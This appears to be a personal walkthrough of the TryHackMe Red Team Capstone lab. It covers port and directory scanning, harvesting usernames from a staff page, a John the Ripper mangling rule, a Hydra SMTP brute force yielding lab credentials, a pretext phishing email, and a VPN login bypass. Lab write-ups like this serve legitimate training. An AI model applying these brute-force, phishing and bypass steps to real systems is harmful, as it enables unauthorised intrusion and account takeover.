# Red Team Capstone Challenge



<figure><img src="../../.gitbook/assets/image (87) (2).png" alt=""><figcaption></figcaption></figure>

**Project Registration**

The Trimento government mandates that all red teamers from TryHackMe participating in the challenge must register to allow their single point of contact for the engagement to track activities. As the island's network is segregated, this will also provide the testers access to an email account for communication with the government and an approved phishing email address, should phishing be performed.

To register, you need to get in touch with the government through its e-Citizen communication portal that uses SSH for communication. Here are the SSH details provided:

| <p>SSH Username<br></p> | <p>e-citizen<br></p>                |
| ----------------------- | ----------------------------------- |
| <p>SSH Password<br></p> | <p>stabilitythroughcurrency<br></p> |
| <p>SSH IP<br></p>       | X.X.X.250                           |

**Kali**

```
ssh e-citizen@X.X.X.250
Password: stabilitythroughcurrency
```

<figure><img src="../../.gitbook/assets/image (84) (2).png" alt=""><figcaption></figcaption></figure>



## Scanning

## Web - Scanning&#x20;

**Kali**

```
nmap -A $WEB
```

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

No other ports found.

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $WEB
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

### Web - HTTP port 80

This ran for the majority of the time I was working on the box, I found the wordpress and checked robots.txt manually and the scan didn't really find anything of interest.

**Kali**

```
dirb http://$WEB:80 /usr/share/wordlists/dirb/big.txt
```

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Looking for php files we found the info file which can be used to find info about the server.

**Kali**

```
dirb http://$WEB:80 /usr/share/wordlists/dirb/big.txt -X .php
```

<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

Manually looking around there is a meet the team page, when clicking on the images we can see the folder holding all their pictures with their names, potentially could be usernames.

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

**Output - users.txt**

```
antony.ross
ashley.chan
brenda.henderson
charlene.thomas
christopher.smith
emily.harvey
keith.allen
laura.wood
leslie.morley
lynda.gordon
martin.savage
mohammad.ahmed
october
october
paula.bailey
rhys.parsons.
roy.sims
theme-preview
```





**Admin Panel**

[http://10.200.119.13/october/index.php/backend/backend/auth/signin](http://10.200.119.13/october/index.php/backend/backend/auth/signin)

<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>





**Kali**

```
hydra -L users.txt -P mangled-passwords.txt smtp://$WebMail -V
```



##

## WebMail - Scanning&#x20;

**Kali**

```
nmap -A $WebMail
```

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $WebMail
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>

### WebMail - HTTP port 80

Nothing found

**Kali**

```
dirb http://$WebMail:80 /usr/share/wordlists/dirb/big.txt
```

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

### Evolution

**Kali**

```
apt install evolution -y
evolution &
```

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>



### Bruteforce SMTP

Add domain to end of every username

**Kali**

```
sed -i 's/$/@corp.thereserve.loc/' users.txt
```

**Kali**

```
subl /opt/john/john.conf
```

Add the following to the bottom of john.conf

**john.conf**

```
#Custom Rules
[List.Rules:Capstone]
Az"[0-9]" $[!@#%^]
```

**Kali**

```
john --wordlist=Capstone_Challenge_Resources/password_base_list.txt --rules=Capstone --stdout > mangled-passwords.txt
```

**Kali**

```
hydra -L users.txt -P mangled-passwords.txt smtp://$WebMail -V -o smtp-results.txt
```

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>



### Evolution - laura.wood@corp.thereserve.loc

Email sent to emily.harvey@corp.thereserve.loc

```
Dear Emily,

I hope this message finds you well. I wanted to inform you about an
exciting development for our organization. We have recently acquired a
new customer who is interested in investing in a reputable bank, and we
believe "TheReserve" bank is an excellent choice for their investment goals.

"TheReserve" bank has a strong track record of financial stability,
customer satisfaction, and a wide range of investment opportunities.
They are renowned for their expertise in wealth management, corporate
banking, and private client services. We believe that by partnering with
them, our customer can benefit from their extensive experience and
comprehensive financial solutions.

The customer is specifically looking to invest a substantial amount and
is seeking guidance on the available investment options and potential
returns. As our resident expert in financial planning and investment
strategies, I would like to request your assistance in advising this
client on the investment opportunities offered by "TheReserve" bank.

Please review the customer's investment preferences and financial
objectives, and provide a detailed recommendation outlining the most
suitable investment options that align with their goals. It would be
helpful if you could emphasize the key benefits and features of each
investment, including potential returns, risk factors, and any other
relevant considerations.

Additionally, if there are any specific documents or forms that the
customer needs to complete to initiate the investment process with
"TheReserve" bank, please provide those as well. Ensuring a smooth and
seamless experience for our customer is of utmost importance to us.

If you have any questions or require any further information, please
don't hesitate to reach out to me. I appreciate your expertise and
dedication to delivering exceptional service to our clients, and I am
confident that you will provide valuable insights to our new customer in
their investment journey.

Thank you for your prompt attention to this matter. I look forward to
hearing from you soon.

Best regards,


```

### Evolution - mohammad.ahmed@corp.thereserve.loc

Email sent to mohammad.ahmed@corp.thereserve.loc

```
Sorry, you message was flagged as spam and has been automatically deleted.

Regards,SpamBot

On Thu, 18 May 2023 08:49:01 -0400, Mohammad Ahmed <mohammad.ahmed@corp.thereserve.loc> wrote:
Dear Emily,

I hope this message finds you well. I wanted to inform you about an 
exciting development for our organization. We have recently acquired a 
new customer who is interested in investing in a reputable bank, and we 
believe "TheReserve" bank is an excellent choice for their investment goals.

"TheReserve" bank has a strong track record of financial stability, 
customer satisfaction, and a wide range of investment opportunities. 
They are renowned for their expertise in wealth management, corporate 
banking, and private client services. We believe that by partnering with 
them, our customer can benefit from their extensive experience and 
comprehensive financial solutions.

The customer is specifically looking to invest a substantial amount and 
is seeking guidance on the available investment options and potential 
returns. As our resident expert in financial planning and investment 
strategies, I would like to request your assistance in advising this 
client on the investment opportunities offered by "TheReserve" bank.

Please review the customer's investment preferences and financial 
objectives, and provide a detailed recommendation outlining the most 
suitable investment options that align with their goals. It would be 
helpful if you could emphasize the key benefits and features of each 
investment, including potential returns, risk factors, and any other 
relevant considerations.

Additionally, if there are any specific documents or forms that the 
customer needs to complete to initiate the investment process with 
"TheReserve" bank, please provide those as well. Ensuring a smooth and 
seamless experience for our customer is of utmost importance to us.

If you have any questions or require any further information, please 
don't hesitate to reach out to me. I appreciate your expertise and 
dedication to delivering exceptional service to our clients, and I am 
confident that you will provide valuable insights to our new customer in 
their investment journey.

Thank you for your prompt attention to this matter. I look forward to 
hearing from you soon.

Best regards,

```

## VPN - Scanning&#x20;

**Kali**

```
nmap -A $VPN 
```

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

OpenVPN port potentially found

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $VPN 
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### VPN - HTTP port 80



**Kali**

```
dirb http://$VPN:80 /usr/share/wordlists/dirb/big.txt
```

<figure><img src="../../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

vpn folder has a .ovpn file.

<figure><img src="../../.gitbook/assets/image (86) (2).png" alt=""><figcaption></figcaption></figure>

I don't think it is useful. May just be a default file as the IP address are set as .X.X

**Kali**

```
openvpn corpUsername.ovpn
```

<figure><img src="../../.gitbook/assets/image (82) (2).png" alt=""><figcaption></figcaption></figure>

If I type my username and password provided I get a login error but if I try with a fake account with no password set I can bypass the login and download a ovpn file

<figure><img src="../../.gitbook/assets/image (27) (5).png" alt=""><figcaption></figcaption></figure>



<figure><img src="../../.gitbook/assets/image (42) (3).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

It appears to work

**Kali**

```
openvpn fake.ovpn
```

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ip a
```

<figure><img src="../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nmap -sP 12.100.1.1-255
```

<figure><img src="../../.gitbook/assets/image (85) (2).png" alt=""><figcaption></figcaption></figure>

12.100.1.10

## WebMail- Scanning&#x20;

**Kali**

```
nmap -A $WebMail
```



### Scan all ports

**Kali**

<pre><code><strong>nmap -sV -sT -O -p 1-65535 $WebMail
</strong></code></pre>





<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

We now have access to our mailbox

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

The following email is in my inbox

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

## Creds found

```
#SMTP creds found for WebMail
[25][smtp] host: 10.200.119.11   login: laura.wood@corp.thereserve.loc   password: Password1@
[25][smtp] host: 10.200.119.11   login: mohammad.ahmed@corp.thereserve.loc   password: Password1!

```



